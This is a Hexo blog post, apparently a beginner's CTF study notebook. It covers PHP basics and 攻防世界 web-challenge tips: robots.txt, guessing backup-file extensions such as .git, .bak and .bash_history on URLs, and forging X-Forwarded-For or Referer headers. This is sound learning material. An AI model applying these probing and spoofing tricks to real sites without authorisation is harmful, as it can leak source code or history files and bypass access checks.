@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"n9-zqc.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="早期入门笔记汇总">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctf早期入门笔记">
+<meta property="og:url" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="N9-zqc">
+<meta property="og:description" content="早期入门笔记汇总">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220110214716836.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220110221658051.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/4AE1AD40B27296DD44B5DB360EAEB8DB.jpg">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112124205853.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112124524102.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112124600715.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112124711559.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112124825045.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112125032615.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112125127242.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112125311286.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112125454281.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112125531705.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112125557934.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112125715493.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112125810511.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/A5621026209D0C3DE5D1B547ED41D9B4.jpg">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/C991E127363988AE9BE54161B6151FEB.jpg">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/EF32A94B4F91D133D713EFA3919E95B4.jpg">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/284A172A651A7504A5CF607565B31768.jpg">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/E52FFBFB86DE56854F475E14E4903BC9.jpg">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/78EDC1726CF8A38BE2EDA84FE07B0BFB.jpg">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/5F9770055C62306C29CE54D4457E61CC.jpg">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/F1E71CF1B7F50C8D2F317A5BA401D36F.jpg">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/4570478793A7A4F79B0A23A6C9261509.jpg">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/532A2012371F9FF3C88804FBBCA51F05.jpg">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/6078681AB311575F26A3BAD422AD5AD9.jpg">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/532A2012371F9FF3C88804FBBCA51F05-16420762528521.jpg">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/6078681AB311575F26A3BAD422AD5AD9-16420762612902.jpg">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/779E7363184CC6F4749C98B09CBEBE1F.jpg">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/6078681AB311575F26A3BAD422AD5AD9.jpg">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/35EF5EFC8EEEEDEE62A50C89A54508B2.jpg">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/C08D71B5DA4D6DB68995564C1E326BA5.jpg">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/366E62133C677E7B148FE00427F5167B.jpg">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220113222322738.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220113222452282.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220113222613254.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220113222840906.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220113222928126.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220113222948322.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200811115717675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220114183335251.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220122144418229.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220122144828834.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220122145447131.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220122145813725.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220122150107444.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220122152806185.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220115160458937.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220115161203477.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220115162031362.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220122142735351.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220122144039361.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220203144032823.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220203142634656.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220203141153382.png">
+<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220203142828273.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/i-beta/1212355/202002/1212355-20200228200320065-779194663.png">
+<meta property="article:published_time" content="2022-06-04T08:40:50.000Z">
+<meta property="article:modified_time" content="2022-06-04T09:00:49.570Z">
+<meta property="article:author" content="N9-zqc">
+<meta property="article:tag" content="ctfweb早期入门笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220110214716836.png">
+
+<link rel="canonical" href="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>ctf早期入门笔记 | N9-zqc</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">N9-zqc</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">有关网络安全的学习笔记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-文章">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>文章</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-查找">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>查找</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://n9-zqc.github.io/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="N9-zqc">
+      <meta itemprop="description" content="主要有关ctf的学习笔记,主攻逆向和Web">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="N9-zqc">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctf早期入门笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-06-04 16:40:50 / Modified: 17:00:49" itemprop="dateCreated datePublished" datetime="2022-06-04T16:40:50+08:00">2022-06-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>早期入门笔记汇总</p>
+<span id="more"></span>
+
+<h3 id="学习笔记"><a href="#学习笔记" class="headerlink" title="学习笔记"></a>学习笔记</h3><h6 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h6><h6 id="echo-““"><a href="#echo-““" class="headerlink" title="echo ““;"></a>echo “<hr>“;</h6><p>双引号里面可以解析变量“$str 你好”，其会把$str 内容输出，单引号里面是什么就是什么。</p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220110214716836.png" alt="image-20220110214716836"></p>
+<p>print_r 打印全部数组</p>
+<p>foreach 循环数组</p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220110221658051.png" alt="image-20220110221658051"></p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/4AE1AD40B27296DD44B5DB360EAEB8DB.jpg" alt="img"></p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112124205853.png" alt="image-20220112124205853"></p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112124524102.png" alt="image-20220112124524102"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112124600715.png" alt="image-20220112124600715"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112124711559.png" alt="image-20220112124711559"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112124825045.png" alt="image-20220112124825045"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112125032615.png" alt="image-20220112125032615"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112125127242.png" alt="image-20220112125127242"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112125311286.png" alt="image-20220112125311286"></p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112125454281.png" alt="image-20220112125454281"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112125531705.png" alt="image-20220112125531705"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112125557934.png" alt="image-20220112125557934"></p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112125715493.png" alt="image-20220112125715493"></p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220112125810511.png" alt="image-20220112125810511"></p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/A5621026209D0C3DE5D1B547ED41D9B4.jpg" alt="img"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/C991E127363988AE9BE54161B6151FEB.jpg" alt="img"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/EF32A94B4F91D133D713EFA3919E95B4.jpg" alt="img"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/284A172A651A7504A5CF607565B31768.jpg" alt="img"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/E52FFBFB86DE56854F475E14E4903BC9.jpg" alt="img"></p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/78EDC1726CF8A38BE2EDA84FE07B0BFB.jpg" alt="img"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/5F9770055C62306C29CE54D4457E61CC.jpg" alt="img"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/F1E71CF1B7F50C8D2F317A5BA401D36F.jpg" alt="img"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/4570478793A7A4F79B0A23A6C9261509.jpg" alt="img"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/532A2012371F9FF3C88804FBBCA51F05.jpg" alt="img"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/6078681AB311575F26A3BAD422AD5AD9.jpg" alt="img"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/532A2012371F9FF3C88804FBBCA51F05-16420762528521.jpg" alt="img"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/6078681AB311575F26A3BAD422AD5AD9-16420762612902.jpg" alt="img"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/779E7363184CC6F4749C98B09CBEBE1F.jpg" alt="img"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/6078681AB311575F26A3BAD422AD5AD9.jpg" alt="img">)</p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/35EF5EFC8EEEEDEE62A50C89A54508B2.jpg" alt="img"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/C08D71B5DA4D6DB68995564C1E326BA5.jpg" alt="img"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/366E62133C677E7B148FE00427F5167B.jpg" alt="img"></p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220113222322738.png" alt="image-20220113222322738"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220113222452282.png" alt="image-20220113222452282"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220113222613254.png" alt="image-20220113222613254"></p>
+<p>php8新特性</p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220113222840906.png" alt="image-20220113222840906"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220113222928126.png" alt="image-20220113222928126"></p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220113222948322.png" alt="image-20220113222948322"></p>
+<h3 id="做题笔记"><a href="#做题笔记" class="headerlink" title="做题笔记"></a>做题笔记</h3><p>攻防世界题目</p>
+<p>1.Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。</p>
+<p>Robots协议，其存在robots.txt</p>
+<p>2.如果网站存在备份文件，常见的备份文件后缀名有：“.git” 、“.svn”、“ .swp”“.~”、“.bak”、“.bash_history”、“.bkf” 尝试在URL后面，依次输入常见的文件备份扩展名。</p>
+<p>3.掌握有关X-Forwarded-For和Referer的知识：</p>
+<p>（1）X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。xff 是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP</p>
+<p>（2）HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。referer 是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。</p>
